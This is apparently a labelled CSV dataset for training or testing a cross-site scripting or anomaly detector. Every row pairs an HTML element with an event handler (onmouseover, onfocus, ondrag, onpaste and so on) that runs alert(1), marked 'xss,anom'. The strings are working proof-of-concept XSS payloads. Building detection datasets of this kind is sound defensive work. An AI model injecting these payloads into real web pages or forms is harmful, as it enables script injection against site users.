payload,attack_type,label
"<plaintext onmouseleave=""alert(1)"">test</plaintext>",xss,anom
"<plaintext onmousemove=""alert(1)"">test</plaintext>",xss,anom
"<plaintext onmouseout=""alert(1)"">test</plaintext>",xss,anom
"<plaintext onmouseover=""alert(1)"">test</plaintext>",xss,anom
"<plaintext onmouseup=""alert(1)"">test</plaintext>",xss,anom
"<plaintext onpaste=""alert(1)"" contenteditable>test</plaintext>",xss,anom
"<pre draggable=""true"" ondrag=""alert(1)"">test</pre>",xss,anom
"<pre draggable=""true"" ondragend=""alert(1)"">test</pre>",xss,anom
"<pre draggable=""true"" ondragenter=""alert(1)"">test</pre>",xss,anom
"<pre draggable=""true"" ondragleave=""alert(1)"">test</pre>",xss,anom
"<pre draggable=""true"" ondragstart=""alert(1)"">test</pre>",xss,anom
<pre id=x tabindex=1 onactivate=alert(1)></pre>,xss,anom
<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>,xss,anom
<pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>,xss,anom
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,xss,anom
<pre id=x tabindex=1 onfocus=alert(1)></pre>,xss,anom
<pre id=x tabindex=1 onfocusin=alert(1)></pre>,xss,anom
"<pre onbeforecopy=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre onbeforecut=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre onbeforepaste=""alert(1)"" contenteditable>test</pre>",xss,anom
<pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>,xss,anom
"<pre onclick=""alert(1)"">test</pre>",xss,anom
"<pre oncontextmenu=""alert(1)"">test</pre>",xss,anom
"<pre oncopy=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre oncut=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre ondblclick=""alert(1)"">test</pre>",xss,anom
<pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>,xss,anom
"<pre onkeydown=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre onkeypress=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre onkeyup=""alert(1)"" contenteditable>test</pre>",xss,anom
"<pre onmousedown=""alert(1)"">test</pre>",xss,anom
"<pre onmouseenter=""alert(1)"">test</pre>",xss,anom
"<pre onmouseleave=""alert(1)"">test</pre>",xss,anom
"<pre onmousemove=""alert(1)"">test</pre>",xss,anom
"<pre onmouseout=""alert(1)"">test</pre>",xss,anom
"<pre onmouseover=""alert(1)"">test</pre>",xss,anom
"<pre onmouseup=""alert(1)"">test</pre>",xss,anom
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",xss,anom
"<progress draggable=""true"" ondrag=""alert(1)"">test</progress>",xss,anom
"<progress draggable=""true"" ondragend=""alert(1)"">test</progress>",xss,anom
"<progress draggable=""true"" ondragenter=""alert(1)"">test</progress>",xss,anom
"<progress draggable=""true"" ondragleave=""alert(1)"">test</progress>",xss,anom
"<progress draggable=""true"" ondragstart=""alert(1)"">test</progress>",xss,anom
<progress id=x tabindex=1 onactivate=alert(1)></progress>,xss,anom
<progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>,xss,anom
<progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>,xss,anom
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>,xss,anom
<progress id=x tabindex=1 onfocus=alert(1)></progress>,xss,anom
<progress id=x tabindex=1 onfocusin=alert(1)></progress>,xss,anom
"<progress onbeforecopy=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress onbeforecut=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress onbeforepaste=""alert(1)"" contenteditable>test</progress>",xss,anom
<progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>,xss,anom
"<progress onclick=""alert(1)"">test</progress>",xss,anom
"<progress oncontextmenu=""alert(1)"">test</progress>",xss,anom
"<progress oncopy=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress oncut=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress ondblclick=""alert(1)"">test</progress>",xss,anom
<progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>,xss,anom
"<progress onkeydown=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress onkeypress=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress onkeyup=""alert(1)"" contenteditable>test</progress>",xss,anom
"<progress onmousedown=""alert(1)"">test</progress>",xss,anom
"<progress onmouseenter=""alert(1)"">test</progress>",xss,anom
"<progress onmouseleave=""alert(1)"">test</progress>",xss,anom
"<progress onmousemove=""alert(1)"">test</progress>",xss,anom
"<progress onmouseout=""alert(1)"">test</progress>",xss,anom
"<progress onmouseover=""alert(1)"">test</progress>",xss,anom
"<progress onmouseup=""alert(1)"">test</progress>",xss,anom
"<progress onpaste=""alert(1)"" contenteditable>test</progress>",xss,anom
"<q draggable=""true"" ondrag=""alert(1)"">test</q>",xss,anom
"<q draggable=""true"" ondragend=""alert(1)"">test</q>",xss,anom
"<q draggable=""true"" ondragenter=""alert(1)"">test</q>",xss,anom
"<q draggable=""true"" ondragleave=""alert(1)"">test</q>",xss,anom
"<q draggable=""true"" ondragstart=""alert(1)"">test</q>",xss,anom
<q id=x tabindex=1 onactivate=alert(1)></q>,xss,anom
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>,xss,anom
<q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>,xss,anom
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>,xss,anom
<q id=x tabindex=1 onfocus=alert(1)></q>,xss,anom
<q id=x tabindex=1 onfocusin=alert(1)></q>,xss,anom
"<q onbeforecopy=""alert(1)"" contenteditable>test</q>",xss,anom
"<q onbeforecut=""alert(1)"" contenteditable>test</q>",xss,anom
"<q onbeforepaste=""alert(1)"" contenteditable>test</q>",xss,anom
<q onblur=alert(1) tabindex=1 id=x></q><input autofocus>,xss,anom
"<q onclick=""alert(1)"">test</q>",xss,anom
"<q oncontextmenu=""alert(1)"">test</q>",xss,anom
"<q oncopy=""alert(1)"" contenteditable>test</q>",xss,anom
"<q oncut=""alert(1)"" contenteditable>test</q>",xss,anom
"<q ondblclick=""alert(1)"">test</q>",xss,anom
<q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>,xss,anom
"<q onkeydown=""alert(1)"" contenteditable>test</q>",xss,anom
"<q onkeypress=""alert(1)"" contenteditable>test</q>",xss,anom
"<q onkeyup=""alert(1)"" contenteditable>test</q>",xss,anom
"<q onmousedown=""alert(1)"">test</q>",xss,anom
"<q onmouseenter=""alert(1)"">test</q>",xss,anom
"<q onmouseleave=""alert(1)"">test</q>",xss,anom
"<q onmousemove=""alert(1)"">test</q>",xss,anom
"<q onmouseout=""alert(1)"">test</q>",xss,anom
"<q onmouseover=""alert(1)"">test</q>",xss,anom
"<q onmouseup=""alert(1)"">test</q>",xss,anom
"<q onpaste=""alert(1)"" contenteditable>test</q>",xss,anom
"<rb draggable=""true"" ondrag=""alert(1)"">test</rb>",xss,anom
"<rb draggable=""true"" ondragend=""alert(1)"">test</rb>",xss,anom
"<rb draggable=""true"" ondragenter=""alert(1)"">test</rb>",xss,anom
"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",xss,anom
"<rb draggable=""true"" ondragstart=""alert(1)"">test</rb>",xss,anom
<rb id=x tabindex=1 onactivate=alert(1)></rb>,xss,anom
<rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>,xss,anom
<rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>,xss,anom
<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>,xss,anom
<rb id=x tabindex=1 onfocus=alert(1)></rb>,xss,anom
<rb id=x tabindex=1 onfocusin=alert(1)></rb>,xss,anom
"<rb onbeforecopy=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb onbeforecut=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb onbeforepaste=""alert(1)"" contenteditable>test</rb>",xss,anom
<rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>,xss,anom
"<rb onclick=""alert(1)"">test</rb>",xss,anom
"<rb oncontextmenu=""alert(1)"">test</rb>",xss,anom
"<rb oncopy=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb oncut=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb ondblclick=""alert(1)"">test</rb>",xss,anom
<rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>,xss,anom
"<rb onkeydown=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb onkeypress=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb onkeyup=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rb onmousedown=""alert(1)"">test</rb>",xss,anom
"<rb onmouseenter=""alert(1)"">test</rb>",xss,anom
"<rb onmouseleave=""alert(1)"">test</rb>",xss,anom
"<rb onmousemove=""alert(1)"">test</rb>",xss,anom
"<rb onmouseout=""alert(1)"">test</rb>",xss,anom
"<rb onmouseover=""alert(1)"">test</rb>",xss,anom
"<rb onmouseup=""alert(1)"">test</rb>",xss,anom
"<rb onpaste=""alert(1)"" contenteditable>test</rb>",xss,anom
"<rp draggable=""true"" ondrag=""alert(1)"">test</rp>",xss,anom
"<rp draggable=""true"" ondragend=""alert(1)"">test</rp>",xss,anom
"<rp draggable=""true"" ondragenter=""alert(1)"">test</rp>",xss,anom
"<rp draggable=""true"" ondragleave=""alert(1)"">test</rp>",xss,anom
"<rp draggable=""true"" ondragstart=""alert(1)"">test</rp>",xss,anom
<rp id=x tabindex=1 onactivate=alert(1)></rp>,xss,anom
<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>,xss,anom
<rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>,xss,anom
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>,xss,anom
<rp id=x tabindex=1 onfocus=alert(1)></rp>,xss,anom
<rp id=x tabindex=1 onfocusin=alert(1)></rp>,xss,anom
"<rp onbeforecopy=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp onbeforecut=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp onbeforepaste=""alert(1)"" contenteditable>test</rp>",xss,anom
<rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>,xss,anom
"<rp onclick=""alert(1)"">test</rp>",xss,anom
"<rp oncontextmenu=""alert(1)"">test</rp>",xss,anom
"<rp oncopy=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp oncut=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp ondblclick=""alert(1)"">test</rp>",xss,anom
<rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>,xss,anom
"<rp onkeydown=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp onkeypress=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp onkeyup=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rp onmousedown=""alert(1)"">test</rp>",xss,anom
"<rp onmouseenter=""alert(1)"">test</rp>",xss,anom
"<rp onmouseleave=""alert(1)"">test</rp>",xss,anom
"<rp onmousemove=""alert(1)"">test</rp>",xss,anom
"<rp onmouseout=""alert(1)"">test</rp>",xss,anom
"<rp onmouseover=""alert(1)"">test</rp>",xss,anom
"<rp onmouseup=""alert(1)"">test</rp>",xss,anom
"<rp onpaste=""alert(1)"" contenteditable>test</rp>",xss,anom
"<rt draggable=""true"" ondrag=""alert(1)"">test</rt>",xss,anom
"<rt draggable=""true"" ondragend=""alert(1)"">test</rt>",xss,anom
"<rt draggable=""true"" ondragenter=""alert(1)"">test</rt>",xss,anom
"<rt draggable=""true"" ondragleave=""alert(1)"">test</rt>",xss,anom
"<rt draggable=""true"" ondragstart=""alert(1)"">test</rt>",xss,anom
<rt id=x tabindex=1 onactivate=alert(1)></rt>,xss,anom
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>,xss,anom
<rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>,xss,anom
<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>,xss,anom
<rt id=x tabindex=1 onfocus=alert(1)></rt>,xss,anom
<rt id=x tabindex=1 onfocusin=alert(1)></rt>,xss,anom
"<rt onbeforecopy=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>",xss,anom
<rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>,xss,anom
"<rt onclick=""alert(1)"">test</rt>",xss,anom
"<rt oncontextmenu=""alert(1)"">test</rt>",xss,anom
"<rt oncopy=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt oncut=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt ondblclick=""alert(1)"">test</rt>",xss,anom
<rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>,xss,anom
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt onkeypress=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt onkeyup=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rt onmousedown=""alert(1)"">test</rt>",xss,anom
"<rt onmouseenter=""alert(1)"">test</rt>",xss,anom
"<rt onmouseleave=""alert(1)"">test</rt>",xss,anom
"<rt onmousemove=""alert(1)"">test</rt>",xss,anom
"<rt onmouseout=""alert(1)"">test</rt>",xss,anom
"<rt onmouseover=""alert(1)"">test</rt>",xss,anom
"<rt onmouseup=""alert(1)"">test</rt>",xss,anom
"<rt onpaste=""alert(1)"" contenteditable>test</rt>",xss,anom
"<rtc draggable=""true"" ondrag=""alert(1)"">test</rtc>",xss,anom
"<rtc draggable=""true"" ondragend=""alert(1)"">test</rtc>",xss,anom
"<rtc draggable=""true"" ondragenter=""alert(1)"">test</rtc>",xss,anom
"<rtc draggable=""true"" ondragleave=""alert(1)"">test</rtc>",xss,anom
"<rtc draggable=""true"" ondragstart=""alert(1)"">test</rtc>",xss,anom
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>,xss,anom
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>,xss,anom
<rtc id=x tabindex=1 onbeforedeactivate=alert(1)></rtc><input autofocus>,xss,anom
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>,xss,anom
<rtc id=x tabindex=1 onfocus=alert(1)></rtc>,xss,anom
<rtc id=x tabindex=1 onfocusin=alert(1)></rtc>,xss,anom
"<rtc onbeforecopy=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc onbeforecut=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc onbeforepaste=""alert(1)"" contenteditable>test</rtc>",xss,anom
<rtc onblur=alert(1) tabindex=1 id=x></rtc><input autofocus>,xss,anom
"<rtc onclick=""alert(1)"">test</rtc>",xss,anom
"<rtc oncontextmenu=""alert(1)"">test</rtc>",xss,anom
"<rtc oncopy=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc oncut=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc ondblclick=""alert(1)"">test</rtc>",xss,anom
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,xss,anom
"<rtc onkeydown=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc onkeypress=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc onkeyup=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<rtc onmousedown=""alert(1)"">test</rtc>",xss,anom
"<rtc onmouseenter=""alert(1)"">test</rtc>",xss,anom
"<rtc onmouseleave=""alert(1)"">test</rtc>",xss,anom
"<rtc onmousemove=""alert(1)"">test</rtc>",xss,anom
"<rtc onmouseout=""alert(1)"">test</rtc>",xss,anom
"<rtc onmouseover=""alert(1)"">test</rtc>",xss,anom
"<rtc onmouseup=""alert(1)"">test</rtc>",xss,anom
"<rtc onpaste=""alert(1)"" contenteditable>test</rtc>",xss,anom
"<ruby draggable=""true"" ondrag=""alert(1)"">test</ruby>",xss,anom
"<ruby draggable=""true"" ondragend=""alert(1)"">test</ruby>",xss,anom
"<ruby draggable=""true"" ondragenter=""alert(1)"">test</ruby>",xss,anom
"<ruby draggable=""true"" ondragleave=""alert(1)"">test</ruby>",xss,anom
"<ruby draggable=""true"" ondragstart=""alert(1)"">test</ruby>",xss,anom
<ruby id=x tabindex=1 onactivate=alert(1)></ruby>,xss,anom
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>,xss,anom
<ruby id=x tabindex=1 onbeforedeactivate=alert(1)></ruby><input autofocus>,xss,anom
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>,xss,anom
<ruby id=x tabindex=1 onfocus=alert(1)></ruby>,xss,anom
<ruby id=x tabindex=1 onfocusin=alert(1)></ruby>,xss,anom
"<ruby onbeforecopy=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby onbeforecut=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby onbeforepaste=""alert(1)"" contenteditable>test</ruby>",xss,anom
<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>,xss,anom
"<ruby onclick=""alert(1)"">test</ruby>",xss,anom
"<ruby oncontextmenu=""alert(1)"">test</ruby>",xss,anom
"<ruby oncopy=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby ondblclick=""alert(1)"">test</ruby>",xss,anom
<ruby onfocusout=alert(1) tabindex=1 id=x></ruby><input autofocus>,xss,anom
"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby onkeypress=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby onkeyup=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<ruby onmousedown=""alert(1)"">test</ruby>",xss,anom
"<ruby onmouseenter=""alert(1)"">test</ruby>",xss,anom
"<ruby onmouseleave=""alert(1)"">test</ruby>",xss,anom
"<ruby onmousemove=""alert(1)"">test</ruby>",xss,anom
"<ruby onmouseout=""alert(1)"">test</ruby>",xss,anom
"<ruby onmouseover=""alert(1)"">test</ruby>",xss,anom
"<ruby onmouseup=""alert(1)"">test</ruby>",xss,anom
"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",xss,anom
"<s draggable=""true"" ondrag=""alert(1)"">test</s>",xss,anom
"<s draggable=""true"" ondragend=""alert(1)"">test</s>",xss,anom
"<s draggable=""true"" ondragenter=""alert(1)"">test</s>",xss,anom
"<s draggable=""true"" ondragleave=""alert(1)"">test</s>",xss,anom
"<s draggable=""true"" ondragstart=""alert(1)"">test</s>",xss,anom
<s id=x tabindex=1 onactivate=alert(1)></s>,xss,anom
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>,xss,anom
<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>,xss,anom
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>,xss,anom
<s id=x tabindex=1 onfocus=alert(1)></s>,xss,anom
<s id=x tabindex=1 onfocusin=alert(1)></s>,xss,anom
"<s onbeforecopy=""alert(1)"" contenteditable>test</s>",xss,anom
"<s onbeforecut=""alert(1)"" contenteditable>test</s>",xss,anom
"<s onbeforepaste=""alert(1)"" contenteditable>test</s>",xss,anom
<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>,xss,anom
"<s onclick=""alert(1)"">test</s>",xss,anom
"<s oncontextmenu=""alert(1)"">test</s>",xss,anom
"<s oncopy=""alert(1)"" contenteditable>test</s>",xss,anom
"<s oncut=""alert(1)"" contenteditable>test</s>",xss,anom
"<s ondblclick=""alert(1)"">test</s>",xss,anom
<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>,xss,anom
"<s onkeydown=""alert(1)"" contenteditable>test</s>",xss,anom
"<s onkeypress=""alert(1)"" contenteditable>test</s>",xss,anom
"<s onkeyup=""alert(1)"" contenteditable>test</s>",xss,anom
"<s onmousedown=""alert(1)"">test</s>",xss,anom
"<s onmouseenter=""alert(1)"">test</s>",xss,anom
"<s onmouseleave=""alert(1)"">test</s>",xss,anom
"<s onmousemove=""alert(1)"">test</s>",xss,anom
"<s onmouseout=""alert(1)"">test</s>",xss,anom
"<s onmouseover=""alert(1)"">test</s>",xss,anom
"<s onmouseup=""alert(1)"">test</s>",xss,anom
"<s onpaste=""alert(1)"" contenteditable>test</s>",xss,anom
"<samp draggable=""true"" ondrag=""alert(1)"">test</samp>",xss,anom
"<samp draggable=""true"" ondragend=""alert(1)"">test</samp>",xss,anom
"<samp draggable=""true"" ondragenter=""alert(1)"">test</samp>",xss,anom
"<samp draggable=""true"" ondragleave=""alert(1)"">test</samp>",xss,anom
"<samp draggable=""true"" ondragstart=""alert(1)"">test</samp>",xss,anom
<samp id=x tabindex=1 onactivate=alert(1)></samp>,xss,anom
<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>,xss,anom
<samp id=x tabindex=1 onbeforedeactivate=alert(1)></samp><input autofocus>,xss,anom
<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>,xss,anom
<samp id=x tabindex=1 onfocus=alert(1)></samp>,xss,anom
<samp id=x tabindex=1 onfocusin=alert(1)></samp>,xss,anom
"<samp onbeforecopy=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp onbeforecut=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp onbeforepaste=""alert(1)"" contenteditable>test</samp>",xss,anom
<samp onblur=alert(1) tabindex=1 id=x></samp><input autofocus>,xss,anom
"<samp onclick=""alert(1)"">test</samp>",xss,anom
"<samp oncontextmenu=""alert(1)"">test</samp>",xss,anom
"<samp oncopy=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp oncut=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp ondblclick=""alert(1)"">test</samp>",xss,anom
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,xss,anom
"<samp onkeydown=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp onkeypress=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp onkeyup=""alert(1)"" contenteditable>test</samp>",xss,anom
"<samp onmousedown=""alert(1)"">test</samp>",xss,anom
"<samp onmouseenter=""alert(1)"">test</samp>",xss,anom
"<samp onmouseleave=""alert(1)"">test</samp>",xss,anom
"<samp onmousemove=""alert(1)"">test</samp>",xss,anom
"<samp onmouseout=""alert(1)"">test</samp>",xss,anom
"<samp onmouseover=""alert(1)"">test</samp>",xss,anom
"<samp onmouseup=""alert(1)"">test</samp>",xss,anom
"<samp onpaste=""alert(1)"" contenteditable>test</samp>",xss,anom
"<script draggable=""true"" ondrag=""alert(1)"">test</script>",xss,anom
"<script draggable=""true"" ondragend=""alert(1)"">test</script>",xss,anom
"<script draggable=""true"" ondragenter=""alert(1)"">test</script>",xss,anom
"<script draggable=""true"" ondragleave=""alert(1)"">test</script>",xss,anom
"<script draggable=""true"" ondragstart=""alert(1)"">test</script>",xss,anom
<script id=x tabindex=1 onactivate=alert(1)></script>,xss,anom
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>,xss,anom
<script id=x tabindex=1 onbeforedeactivate=alert(1)></script><input autofocus>,xss,anom
<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>,xss,anom
<script id=x tabindex=1 onfocus=alert(1)></script>,xss,anom
<script id=x tabindex=1 onfocusin=alert(1)></script>,xss,anom
"<script onbeforecopy=""alert(1)"" contenteditable>test</script>",xss,anom
"<script onbeforecut=""alert(1)"" contenteditable>test</script>",xss,anom
"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",xss,anom
<script onblur=alert(1) tabindex=1 id=x></script><input autofocus>,xss,anom
"<script onclick=""alert(1)"">test</script>",xss,anom
"<script oncontextmenu=""alert(1)"">test</script>",xss,anom
"<script oncopy=""alert(1)"" contenteditable>test</script>",xss,anom
"<script oncut=""alert(1)"" contenteditable>test</script>",xss,anom
"<script ondblclick=""alert(1)"">test</script>",xss,anom
<script onerror=alert(1) src=/></script>,xss,anom
<script onfocusout=alert(1) tabindex=1 id=x></script><input autofocus>,xss,anom
"<script onkeydown=""alert(1)"" contenteditable>test</script>",xss,anom
"<script onkeypress=""alert(1)"" contenteditable>test</script>",xss,anom
"<script onkeyup=""alert(1)"" contenteditable>test</script>",xss,anom
<script onload=alert(1) src=validjs.js></script>,xss,anom
"<script onmousedown=""alert(1)"">test</script>",xss,anom
"<script onmouseenter=""alert(1)"">test</script>",xss,anom
"<script onmouseleave=""alert(1)"">test</script>",xss,anom
"<script onmousemove=""alert(1)"">test</script>",xss,anom
"<script onmouseout=""alert(1)"">test</script>",xss,anom
"<script onmouseover=""alert(1)"">test</script>",xss,anom
"<script onmouseup=""alert(1)"">test</script>",xss,anom
"<script onpaste=""alert(1)"" contenteditable>test</script>",xss,anom
<script onreadystatechange=alert(1)></script>,xss,anom
"<section draggable=""true"" ondrag=""alert(1)"">test</section>",xss,anom
"<section draggable=""true"" ondragend=""alert(1)"">test</section>",xss,anom
"<section draggable=""true"" ondragenter=""alert(1)"">test</section>",xss,anom
"<section draggable=""true"" ondragleave=""alert(1)"">test</section>",xss,anom
"<section draggable=""true"" ondragstart=""alert(1)"">test</section>",xss,anom
<section id=x tabindex=1 onactivate=alert(1)></section>,xss,anom
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>,xss,anom
<section id=x tabindex=1 onbeforedeactivate=alert(1)></section><input autofocus>,xss,anom
<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>,xss,anom
<section id=x tabindex=1 onfocus=alert(1)></section>,xss,anom
<section id=x tabindex=1 onfocusin=alert(1)></section>,xss,anom
"<section onbeforecopy=""alert(1)"" contenteditable>test</section>",xss,anom
"<section onbeforecut=""alert(1)"" contenteditable>test</section>",xss,anom
"<section onbeforepaste=""alert(1)"" contenteditable>test</section>",xss,anom
<section onblur=alert(1) tabindex=1 id=x></section><input autofocus>,xss,anom
"<section onclick=""alert(1)"">test</section>",xss,anom
"<section oncontextmenu=""alert(1)"">test</section>",xss,anom
"<section oncopy=""alert(1)"" contenteditable>test</section>",xss,anom
"<section oncut=""alert(1)"" contenteditable>test</section>",xss,anom
"<section ondblclick=""alert(1)"">test</section>",xss,anom
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>,xss,anom
"<section onkeydown=""alert(1)"" contenteditable>test</section>",xss,anom
"<section onkeypress=""alert(1)"" contenteditable>test</section>",xss,anom
"<section onkeyup=""alert(1)"" contenteditable>test</section>",xss,anom
"<section onmousedown=""alert(1)"">test</section>",xss,anom
"<section onmouseenter=""alert(1)"">test</section>",xss,anom
"<section onmouseleave=""alert(1)"">test</section>",xss,anom
"<section onmousemove=""alert(1)"">test</section>",xss,anom
"<section onmouseout=""alert(1)"">test</section>",xss,anom
"<section onmouseover=""alert(1)"">test</section>",xss,anom
"<section onmouseup=""alert(1)"">test</section>",xss,anom
"<section onpaste=""alert(1)"" contenteditable>test</section>",xss,anom
<select autofocus onfocus=alert(1)>,xss,anom
<select autofocus onfocusin=alert(1)>,xss,anom
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",xss,anom
"<select draggable=""true"" ondragend=""alert(1)"">test</select>",xss,anom
"<select draggable=""true"" ondragenter=""alert(1)"">test</select>",xss,anom
"<select draggable=""true"" ondragleave=""alert(1)"">test</select>",xss,anom
"<select draggable=""true"" ondragstart=""alert(1)"">test</select>",xss,anom
<select id=x tabindex=1 onactivate=alert(1)></select>,xss,anom
<select id=x tabindex=1 onbeforeactivate=alert(1)></select>,xss,anom
